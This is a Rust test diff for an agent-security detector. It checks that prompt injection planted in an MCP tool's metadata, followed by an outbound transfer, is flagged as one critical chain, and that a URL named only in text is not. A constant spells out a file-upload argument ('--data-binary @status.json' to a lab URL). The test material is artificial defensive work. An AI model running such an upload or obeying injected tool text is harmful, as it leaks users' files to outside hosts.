@@ -522,6 +522,12 @@ type Uc001SourceCase = (
     &'static str,
 );
 
+/// The zero-point rule a reference to the controlled domain raises.
+const UC001_MENTION: &str = "network.controlled_test_domain.mention";
+
+/// The outbound transfer each UC-001 positive runs after the injected text.
+const UC001_TRANSFER: &str = "--data-binary @status.json https://darkroastcyber.io/mcp-lab";
+
 fn uc001_source_cases() -> Vec<Uc001SourceCase> {
     use telltale_schema::clients::{ClientId as C, SourceKind as K};
     vec![
@@ -628,12 +634,16 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
             "UC-001 exact identity coverage: expected {expected:?}, represented {represented:?}"
         ));
     }
-    let rules = compile_rule_v1(
-        &telltale_rules::load_default_rule_set()
-            .map_err(|error| error.to_string())?
-            .compatibility_export(),
-    )
-    .map_err(|error| error.to_string())?;
+    let export = telltale_rules::load_default_rule_set()
+        .map_err(|error| error.to_string())?
+        .compatibility_export();
+    let rules = compile_rule_v1(&export).map_err(|error| error.to_string())?;
+    let exfiltration = export
+        .rules()
+        .iter()
+        .filter(|rule| rule.category == "exfiltration")
+        .map(|rule| rule.id.as_str())
+        .collect::<BTreeSet<_>>();
     let temp = tempfile::tempdir().map_err(|error| error.to_string())?;
     let uc001_rules = [
         "mcp.tool_metadata.prompt_injection",
@@ -701,17 +711,20 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
             }
             let instance =
                 CorrelationId::source_reported(format!("uc001:{source_id}:{is_positive}")).unwrap();
-            let evaluation = evaluate_source(
-                CanonicalSourceInput {
-                    client,
-                    source_id,
-                    source_instance: Some(&instance),
-                    observations: &observations,
-                },
-                &rules,
-                None,
-            )
-            .map_err(|error| format!("{context}: {error}"))?;
+            let evaluate_observations = |observations: &[_]| {
+                evaluate_source(
+                    CanonicalSourceInput {
+                        client,
+                        source_id,
+                        source_instance: Some(&instance),
+                        observations,
+                    },
+                    &rules,
+                    None,
+                )
+                .map_err(|error| format!("{context}: {error}"))
+            };
+            let evaluation = evaluate_observations(&observations)?;
             if evaluation.sessions().is_empty() {
                 return Err(format!("{context}: no evaluated sessions"));
             }
@@ -744,7 +757,9 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
                 {
                     return Err(format!("{context}: expected Copilot UC-001 visibility gap"));
                 }
-                for rule in &uc001_rules[..2] {
+                // The rules that read the injected tool result need message
+                // capture, which this source does not report.
+                for rule in &[uc001_rules[0], UC001_MENTION] {
                     let detector = sessions[0]
                         .detectors()
                         .iter()
@@ -767,17 +782,59 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
                     }
                 }
             } else if is_positive {
-                if !evaluation.sessions().iter().any(|session| {
+                let Some(attack) = evaluation.sessions().iter().find(|session| {
                     session.rule_score()
                         >= u64::from(evaluate::CANONICAL_EVALUATION_THRESHOLDS.critical)
                         && uc001_rules
                             .iter()
                             .all(|rule| session.rule_ids().iter().any(|id| id == rule))
-                }) {
+                }) else {
                     return Err(format!(
                         "{context}: expected critical MCP injection + controlled egress in one session; got {:?}",
                         evaluation
                             .sessions()
+                            .iter()
+                            .map(|session| (session.rule_score(), session.rule_ids()))
+                            .collect::<Vec<_>>()
+                    ));
+                };
+                // Its twin without the transfer call names the URL only in
+                // the injected text: both findings stay, the chain does not.
+                let mention_only = observations
+                    .iter()
+                    // Sources record the command in different fields.
+                    .filter(|observation| {
+                        let transfer = |value: Option<&JsonValue>| {
+                            matches!(value, Some(JsonValue::String(text)) if text.contains(UC001_TRANSFER))
+                        };
+                        !(transfer(observation.facets().get("command.text").map(|facet| facet.value()))
+                            || matches!(observation.body(), ObservationBody::Tool(tool)
+                                if transfer(tool.arguments())
+                                    || tool.searchable_arguments().is_some_and(|text| text.contains(UC001_TRANSFER))))
+                    })
+                    .cloned()
+                    .collect::<Vec<_>>();
+                let twin = evaluate_observations(&mention_only)?;
+                // The attack session itself, not any session of the source.
+                let twin_attack = twin
+                    .sessions()
+                    .iter()
+                    .find(|session| session.session_id() == attack.session_id());
+                if mention_only.len() == observations.len()
+                    || attack.session_id().is_none()
+                    || !twin_attack.is_some_and(|session| {
+                        let ids = session.rule_ids();
+                        [uc001_rules[0], UC001_MENTION]
+                            .iter()
+                            .all(|rule| ids.iter().any(|id| id == rule))
+                            && !ids.iter().any(|id| {
+                                id == uc001_rules[2] || exfiltration.contains(id.as_str())
+                            })
+                    })
+                {
+                    return Err(format!(
+                        "{context}: a URL named only in text must raise the injection and the reference, no exfiltration finding and no chain; got {:?}",
+                        twin.sessions()
                             .iter()
                             .map(|session| (session.rule_score(), session.rule_ids()))
                             .collect::<Vec<_>>()
